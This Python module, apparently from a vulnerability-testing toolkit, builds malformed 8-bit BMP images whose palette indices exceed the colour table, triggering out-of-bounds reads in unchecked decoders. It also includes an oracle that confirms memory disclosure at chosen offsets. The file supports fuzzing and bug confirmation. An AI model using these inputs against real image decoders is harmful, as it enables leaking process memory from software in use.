"""Directed trigger for a BMP palette over-read behind the container (CWE-125 / CWE-200).

The BMP analogue of the GIF/PNG palette over-read. An 8-bit (indexed) BMP stores one palette index
per pixel and a colour table of `biClrUsed` entries; a decoder that maps each index into the table
without checking it against the entry count reads past the table and copies adjacent memory into
the decoded RGB output -- an out-of-bounds READ that is also an information DISCLOSURE. A blind
fuzzer rarely keeps the BITMAPFILEHEADER + BITMAPINFOHEADER + colour table + padded bottom-up pixel
rows all consistent while making one index exceed the table; the directed construction lands it in
one shot once a detector has narrowed to the palette-index sink.

Pure stdlib (struct); the byte layout mirrors structure.py's BMP model.
"""
from __future__ import annotations

import struct


def _row_padded(indices: bytes) -> bytes:
    """A BMP pixel row padded up to a 4-byte boundary (8-bit: one index byte per pixel)."""
    pad = (-len(indices)) % 4
    return indices + b"\x00" * pad


def bmp_overindexed(*, colors: int = 2, index: int = 255, width: int = 8, height: int = 1,
                    palette: "bytes | None" = None) -> bytes:
    """A STRUCTURALLY VALID 8-bit (indexed) BMP whose colour table has `colors` entries and whose
    every pixel is `index`. When `index >= colors`, a decoder that indexes the table by the pixel
    value reads past it.

    `palette`, when given, is the raw colour table (4*colors BGRA bytes) -- a recognisable pattern
    for the disclosure oracle; otherwise a minimal black/white table. Rows are stored bottom-up and
    padded to 4 bytes, as the BMP format requires.
    """
    if not (0 <= index <= 255):
        raise ValueError("an 8-bit BMP palette index is one byte (0..255)")
    if colors < 1 or colors > 256:
        raise ValueError("an 8-bit BMP colour table has 1..256 entries")
    if palette is None:
        pal = bytearray()
        for k in range(colors):
            v = 0 if k == 0 else 255
            pal += bytes((v, v, v, 0))                   # BGRA (reserved 0)
        palette = bytes(pal)
    elif len(palette) != colors * 4:
        raise ValueError(f"palette must be {colors*4} BGRA bytes for a {colors}-entry table")

    row = _row_padded(bytes((index,)) * width)
    pixels = row * height                                # bottom-up; all rows identical here
    file_hdr_size, dib_size = 14, 40
    pixoff = file_hdr_size + dib_size + len(palette)
    filesize = pixoff + len(pixels)
    bfh = b"BM" + struct.pack("<IHHI", filesize, 0, 0, pixoff)
    # BITMAPINFOHEADER: size, w, h, planes=1, bpp=8, compression=0 (BI_RGB), imgsize, ppm x/y,
    # clrused=colors, clrimportant=colors.
    bih = struct.pack("<IiiHHIIiiII", dib_size, width, height, 1, 8, 0, len(pixels),
                      2835, 2835, colors, colors)
    return bfh + bih + palette + pixels


# ------------------------------------------------------------------ L3: disclosure, forgery-proof

def confirm_disclosure(read_pixel, *, colors: int = 2, in_bounds_index: int = 0,
                       probe_indices=(32, 96, 160, 224), width: int = 64, height: int = 8) -> dict:
    """Confirm the palette over-read DISCLOSES memory at an attacker-chosen offset -- L3. Identical
    forgery-proof oracle to the GIF/PNG paths: `read_pixel(bmp_bytes) -> (r, g, b) | None` returns
    the first decoded output pixel; an in-bounds index must return the known palette entry (negative
    control), and >=2 out-of-range indices must return >=2 distinct non-palette triples that vary
    with the chosen offset (the read address is table + index*stride)."""
    pal = bytearray()
    for k in range(colors):
        pal += bytes(((k * 17 + 1) & 0xFF, (k * 29 + 7) & 0xFF, (k * 43 + 13) & 0xFF, 0))  # BGRA
    # the decoded RGB the oracle compares against is the (R,G,B) a converter emits; BMP stores BGRA,
    # so the emitted pixel for entry k is (R,G,B) = (pal[k].2, pal[k].1, pal[k].0) reversed. Build the
    # palette-entry set in emitted-RGB order so "equals a palette entry" is a meaningful exclusion.
    def _rgb(k):
        b, g, r = pal[4 * k], pal[4 * k + 1], pal[4 * k + 2]
        return (r, g, b)
    pal_entries = {_rgb(k) for k in range(colors)}

    def _px(idx):
        return read_pixel(bmp_overindexed(colors=colors, index=idx, width=width, height=height,
                                          palette=bytes(pal)))

    control = _px(in_bounds_index % colors)
    want = _rgb(in_bounds_index % colors)
    if control not in (want, (want[2], want[1], want[0])):   # tolerate RGB or BGR output order
        return {"disclosed": False, "control_ok": False, "control": control, "expected": want,
                "why": "in-bounds index did not return the known palette entry -- cannot trust the "
                       "channel (wrong output mode, or the target did not render)"}

    leaked = {}
    for idx in probe_indices:
        if idx < colors:
            continue
        px = _px(idx)
        if px is not None and tuple(px) not in pal_entries:
            leaked[idx] = tuple(px)

    distinct = set(leaked.values())
    disclosed = len(leaked) >= 2 and len(distinct) >= 2
    return {"disclosed": disclosed, "control_ok": True, "control": control, "colors": colors,
            "leaked": leaked,
            "why": (f"out-of-range palette indices disclosed {len(distinct)} distinct non-palette "
                    f"triples (attacker-chosen read offset table+index*stride); the in-bounds index "
                    f"returned the palette entry as a negative control"
                    if disclosed else
                    "the over-read region held no attacker-distinguishable content on this input "
                    "(only zeros or palette-equal bytes) -- a larger/groomed heap is needed")}
